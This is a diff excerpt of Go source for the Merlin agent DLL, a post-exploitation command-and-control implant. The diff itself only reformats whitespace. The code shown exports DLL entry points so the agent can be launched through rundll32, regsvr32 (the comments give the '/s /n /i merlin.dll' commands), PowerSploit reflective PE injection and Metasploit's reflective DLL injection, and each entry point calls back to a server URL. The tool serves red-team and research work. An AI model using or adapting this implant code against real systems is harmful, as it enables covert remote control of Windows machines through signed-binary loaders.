@@ -33,8 +33,8 @@ var url = "https://127.0.0.1:443/"
 func main() {}
 
 // run is a private function called by exported functions to instantiate/execute the Agent
-func run(URL string){
-	a := agent.New("h2",false, false)
+func run(URL string) {
+	a := agent.New("h2", false, false)
 	a.Run(URL)
 }
 
@@ -42,10 +42,10 @@ func run(URL string){
 
 //export Run
 // Run is the main function used to start the Merlin agent taking 1 argument for the Merlin server's address
-func Run(){
+func Run() {
 	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,VoidFunc"
 	if len(os.Args) >= 3 {
-		if strings.HasPrefix(strings.ToLower(os.Args[0]),"rundll32"){
+		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
 			url = os.Args[2]
 		}
 	}
@@ -54,28 +54,28 @@ func Run(){
 
 //export VoidFunc
 // VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
-func VoidFunc() {run(url)}
+func VoidFunc() { run(url) }
 
 //export DllInstall
 // DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
 // TODO add support for passing Merlin server URL with /i:"https://192.168.1.100:443" merlin.dll
-func DllInstall(){run(url)}
+func DllInstall() { run(url) }
 
 //export DllRegisterServer
 // DLLRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
-func DllRegisterServer(){run(url)}
+func DllRegisterServer() { run(url) }
 
 //export DllUnregisterServer
 // DLLUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
-func DllUnregisterServer(){run(url)}
+func DllUnregisterServer() { run(url) }
 
 //export ReflectiveLoader
 // ReflectiveLoader is used when calling Metasploit's windows/manage/reflective_dll_inject module.
 // This is broken and causes the process to crash
-func ReflectiveLoader(){run(url)}
+func ReflectiveLoader() { run(url) }
 
 // TODO add entry point of 0 (yes a zero) for use with Metasploit's windows/smb/smb_delivery
 // TODO move exported functions to merlin.c to handle them properly and only export Run()
